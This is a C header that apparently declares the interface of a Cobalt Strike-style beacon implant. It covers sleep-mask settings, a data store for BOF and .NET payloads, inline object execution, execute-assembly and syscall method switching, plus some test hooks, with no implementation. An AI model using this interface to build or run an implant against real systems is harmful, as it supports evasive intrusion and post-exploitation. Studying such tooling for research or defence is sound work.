#pragma once
#include <Windows.h>
#include "track_memory.h"

#define DATA_STORE_TYPE_EMPTY        0
#define DATA_STORE_TYPE_GENERAL_FILE 1
#define DATA_STORE_TYPE_BOF          2
#define DATA_STORE_TYPE_DOTNET       3

#ifndef MASK_SIZE
#define MASK_SIZE 13
#endif

typedef struct {
	char * ptr;
	size_t size;
} HEAP_RECORD_DS; /* alias; HEAP_RECORD lives in track_memory.h */

typedef struct {
	char  * sleep_mask_ptr;
	DWORD   sleep_mask_text_size;
	DWORD   sleep_mask_total_size;
	char  * beacon_ptr;
	DWORD * sections;
	HEAP_RECORD * heap_records;
	char    mask[MASK_SIZE];
} BEACON_INFO;

typedef struct {
	int type;
	DWORD64 hash;
	BOOL masked;
	char * buffer;
	size_t length;
} DATA_STORE_OBJECT, *PDATA_STORE_OBJECT;

void cs49_apply_settings(void);

void command_data_store(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_data_store_inline_execute(char * buffer, int length);
void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BOOL ignoreToken);
void command_syscall_method_change(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_syscall_method_query(void (*callback)(char * buffer, int length, int type));
int  syscall_method_get(void);
void syscall_method_set(int method);

void BeaconInformation(BEACON_INFO * info);
void beacon_sleep_mask_set_exec(char * ptr, DWORD text_size, DWORD total_size);
BOOL BeaconAddValue(const char * key, void * ptr);
void * BeaconGetValue(const char * key);
BOOL BeaconRemoveValue(const char * key);
PDATA_STORE_OBJECT BeaconDataStoreGetItem(size_t index);
void BeaconDataStoreProtectItem(size_t index);
void BeaconDataStoreUnprotectItem(size_t index);
size_t BeaconDataStoreMaxEntries(void);
char * BeaconGetCustomUserData(void);

/* test-visible store core */
int datastore_add(int type, unsigned long long hash, char * data, int length);
int datastore_remove_at(int index);
int datastore_slot_count(void);
unsigned long long datastore_hash_at(int index);
int datastore_type_at(int index);
void datastore_reset_for_test(int slots);

BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen, int conv);
